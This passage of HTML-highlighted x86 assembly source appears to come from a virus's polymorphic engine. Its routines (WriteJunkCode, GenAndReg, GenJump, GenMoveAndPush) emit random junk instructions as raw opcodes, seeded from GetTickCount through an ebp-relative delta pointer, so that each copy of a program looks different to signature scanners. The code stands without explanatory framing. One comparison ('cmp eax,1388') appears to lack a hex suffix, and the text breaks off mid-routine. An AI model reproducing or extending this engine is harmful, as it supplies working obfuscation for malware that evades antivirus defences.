    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_WJC2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenJump</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitJC</span><span class="sc0">
</span><span class="sc5">_WJC2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2328h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_WJC3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenPushPop</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitJC</span><span class="sc0">
</span><span class="sc5">_WJC3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2ee0h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_WJC4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenIncDec</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitJC</span><span class="sc0">
</span><span class="sc5">_WJC4</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3a98h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_WJC5</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenMoveRegReg</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitJC</span><span class="sc0">
</span><span class="sc5">_WJC5</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OneByte</span><span class="sc0">
</span><span class="sc5">ExitJC</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;output cl:reg id</span><span class="sc0">
</span><span class="sc5">GenMovRegEsp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000600h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc1">;output ch:reg id</span><span class="sc0">
</span><span class="sc5">GenEmptyReg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5208h</span><span class="sc0">   
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0bb8h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_ER</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_ER_</span><span class="sc0">
</span><span class="sc5">_ER</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1770h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_ER2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0dbh</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_ER_</span><span class="sc0">
</span><span class="sc5">_ER2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2328h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_ER3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0c9h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_ER_</span><span class="sc0">
</span><span class="sc5">_ER3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2ee0h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_ER4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_ER_</span><span class="sc0">
</span><span class="sc5">_ER4</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3a98h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_ER5</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_ER_</span><span class="sc0">
</span><span class="sc5">_ER5</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0f6h</span><span class="sc0">
</span><span class="sc5">_ER_</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_ER__</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_E_R</span><span class="sc0">
</span><span class="sc5">_ER__</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2bh</span><span class="sc0">
</span><span class="sc5">_E_R</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">   
    </span><span class="sc6">ret</span><span class="sc0">
    

</span><span class="sc5">GenMoveAndPush</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;number to mov &amp; push</span><span class="sc0">
</span><span class="sc5">No_Esp</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0bch</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">No_Esp</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_WriteJunkCode</span><span class="sc0">          </span><span class="sc1">;gen junk between the mov and the push</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
        
</span><span class="sc5">InitRandomNumber</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RandomNumber</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">RandomNumber</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GenRandomNumber</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;a simple random num generator</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RandomNumber</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">98765abdh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RandomNumber</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RandomNumber</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">WriteJunkCode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">         </span><span class="sc1">;split this procedure</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3e8h</span><span class="sc0">            </span><span class="sc1">;to four procedure's</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fah</span><span class="sc0">            </span><span class="sc1">;in order to give each</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_jnk1</span><span class="sc0">               </span><span class="sc1">;junkcode the same chance</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitJunk</span><span class="sc0">
</span><span class="sc5">_jnk1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1f4h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_jnk2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitJunk</span><span class="sc0">
</span><span class="sc5">_jnk2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2eeh</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_jnk3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode3</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitJunk</span><span class="sc0">
</span><span class="sc5">_jnk3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode4</span><span class="sc0">
</span><span class="sc5">ExitJunk</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">




</span><span class="sc5">WriteJunkCode1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3e8h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fah</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_jnk_1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenAndReg</span><span class="sc0">   </span><span class="sc1">;1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExtJunk1</span><span class="sc0">
</span><span class="sc5">_jnk_1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1f4h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_jnk_2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenJump</span><span class="sc0">     </span><span class="sc1">;2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExtJunk1</span><span class="sc0">
</span><span class="sc5">_jnk_2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2eeh</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_jnk_3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenPushPop</span><span class="sc0">  </span><span class="sc1">;3</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExtJunk1</span><span class="sc0">
</span><span class="sc5">_jnk_3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenIncDec</span><span class="sc0">   </span><span class="sc1">;4</span><span class="sc0">
</span><span class="sc5">ExtJunk1</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">
    
    
</span><span class="sc5">WriteJunkCode2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3e8h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fah</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_jn_k1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenMoveRegReg</span><span class="sc0">   </span><span class="sc1">;5</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExtJunk2</span><span class="sc0">
</span><span class="sc5">_jn_k1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1f4h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_jn_k2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenAnd</span><span class="sc0">      </span><span class="sc1">;6</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExtJunk2</span><span class="sc0">
</span><span class="sc5">_jn_k2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2eeh</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_jn_k3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenMove</span><span class="sc0">     </span><span class="sc1">;7</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExtJunk2</span><span class="sc0">
</span><span class="sc5">_jn_k3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenPushTrashPopReg</span><span class="sc0">  </span><span class="sc1">;8</span><span class="sc0">
</span><span class="sc5">ExtJunk2</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">
    
    
</span><span class="sc5">WriteJunkCode3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3e8h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fah</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_j_nk1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenShrReg</span><span class="sc0">   </span><span class="sc1">;9</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExtJunk3</span><span class="sc0">
</span><span class="sc5">_j_nk1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1f4h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_j_nk2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenShlReg</span><span class="sc0">   </span><span class="sc1">;10</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExtJunk3</span><span class="sc0">
</span><span class="sc5">_j_nk2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2eeh</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_j_nk3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRorReg</span><span class="sc0">   </span><span class="sc1">;11</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExtJunk3</span><span class="sc0">
</span><span class="sc5">_j_nk3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRolReg</span><span class="sc0">   </span><span class="sc1">;12</span><span class="sc0">
</span><span class="sc5">ExtJunk3</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">
    
    
</span><span class="sc5">WriteJunkCode4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3e8h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fah</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">__jnk1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenOrReg</span><span class="sc0">    </span><span class="sc1">;13</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExtJunk4</span><span class="sc0">
</span><span class="sc5">__jnk1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1f4h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">__jnk2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenXorReg</span><span class="sc0">   </span><span class="sc1">;14</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExtJunk4</span><span class="sc0">
</span><span class="sc5">__jnk2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2eeh</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">__jnk3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenSubAddTrash</span><span class="sc0">  </span><span class="sc1">;15</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExtJunk4</span><span class="sc0">
</span><span class="sc5">__jnk3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OneByte</span><span class="sc0">     </span><span class="sc1">;16</span><span class="sc0">
</span><span class="sc5">ExtJunk4</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">




</span><span class="sc5">GenAndReg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;this function generate and reg,reg instruction</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1f40h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3e8h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">and2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exitand</span><span class="sc0">
</span><span class="sc5">and2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7d0h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">and3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0dbh</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exitand</span><span class="sc0">
</span><span class="sc5">and3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0bb8h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">and4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c9h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exitand</span><span class="sc0">
</span><span class="sc5">and4</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fa0h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">and5</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exitand</span><span class="sc0">
</span><span class="sc5">and5</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1388</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">and6</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exitand</span><span class="sc0">
</span><span class="sc5">and6</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1770h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">and7</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0f6h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exitand</span><span class="sc0">
</span><span class="sc5">and7</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1b58h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">and8</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0edh</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exitand</span><span class="sc0">
</span><span class="sc5">and8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e4h</span><span class="sc0">
</span><span class="sc5">exitand</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">23h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GenJump</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;this function generate do nothing condition jump</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">
